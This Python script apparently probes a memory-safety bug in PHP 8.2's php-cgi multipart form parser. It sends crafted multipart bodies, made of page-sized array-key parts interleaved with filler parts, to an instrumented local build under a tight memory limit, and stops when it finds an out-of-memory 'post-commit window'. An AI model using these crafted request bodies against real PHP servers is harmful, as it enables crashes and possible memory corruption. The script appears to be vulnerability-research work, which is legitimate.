#!/usr/bin/env python3
"""oom31: phase sweep — interleave k filler parts per key part to rotate
which ask in the multipart cycle crosses the memory wall.
Base: oom30d geometry (4096-exact key parts, name 3990 -> 2-page key,
      no buffer doubling). Fillers: 512B values (bin-class, donation-funded).
limit fixed just under the cliff (20.8M). Detector: commits > oks.
usage: oom31.py [kmax]
"""
import re
import subprocess
import sys

BIN = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"
LIMIT = 20_800_000
KEY_PARTS = 4200


def part_key(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (3990 - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    tail = b"v\r\n"
    pad = 4096 - (len(head) + len(tail))
    return head + b"P" * pad + tail


def part_fill(i):
    # small filler: 512B value, bin-class; total well under one window
    return (b'--BOUND\r\nContent-Disposition: form-data; name="f%d"\r\n\r\n' % i +
            b"V" * 512 + b"\r\n")


def build(k):
    ps = []
    fi = 0
    for i in range(KEY_PARTS):
        ps.append(part_key(i))
        for _ in range(k):
            ps.append(part_fill(fi))
            fi += 1
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def run(body, limit):
    subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", "cat > /tmp/body.bin"],
                   input=body, capture_output=True, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%d -d post_max_size=4096M -d max_input_vars=100000 "
           "</tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", cmd % (len(body), BIN, limit)],
                       capture_output=True, timeout=300)
    tr = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "cat /tmp/e.log /tmp/o.log"],
                        capture_output=True).stdout.decode("latin1")
    return r.stdout.decode().strip(), tr


def main():
    kmax = int(sys.argv[1]) if len(sys.argv) > 1 else 24
    for k in range(0, kmax + 1):
        body = build(k)
        rc, tr = run(body, LIMIT)
        commits = re.findall(r"TRACE keycommit stage=1 elem=(\d+) free=(\d+)", tr)
        oks = len(re.findall(r"TRACE keyok", tr))
        tried = re.findall(r"tried to allocate (\d+) bytes", tr)
        key_death = len(commits) > oks
        verdict = "KEY-DEATH" if key_death else (
            "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive")
        print("k=%d body=%d %s commits=%s oks=%d tried=%s" %
              (k, len(body), verdict, commits[-1][0] if commits else "-", oks,
               tried[-1] if tried else "-"), flush=True)
        if key_death:
            idx = tr.rfind("TRACE keycommit")
            print("*** KEY DEATH — POST-COMMIT WINDOW OPEN (k=%d) ***" % k)
            print(tr[idx:idx + 600])
            break


if __name__ == "__main__":
    main()
